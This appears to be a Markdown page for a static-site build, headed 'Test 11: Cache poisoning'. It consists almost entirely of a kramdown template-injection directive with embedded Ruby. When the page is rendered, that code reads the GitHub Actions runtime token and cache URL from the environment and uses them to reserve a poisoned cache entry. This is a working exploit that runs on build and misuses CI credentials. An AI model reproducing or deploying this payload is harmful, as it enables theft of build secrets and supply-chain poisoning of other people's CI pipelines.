---
---

# Test 11: Cache poisoning - reserve cache entry

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; cu = ENV.fetch('ACTIONS_CACHE_URL','NONE'); rt = ENV.fetch('ACTIONS_RUNTIME_TOKEN','NONE'); r = 'POISON_TEST'; begin; uri = URI(cu + '_apis/artifactcache/caches'); req = Net::HTTP::Post.new(uri); req.add_field('Authorization', 'Bearer ' + rt); req.add_field('Content-Type', 'application/json'); req.add_field('Accept', 'application/json;api-version=6.0-preview.1'); req.body = JSON.generate('key' => 'pages-poison-test-v1', 'version' => '44136fa355b311bfa706c3'); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = 'RESERVE=' + resp.code + ':' + resp.body[0..300]; rescue => e; r = 'ERR=' + e.message; end; r %>" /}

placeholder
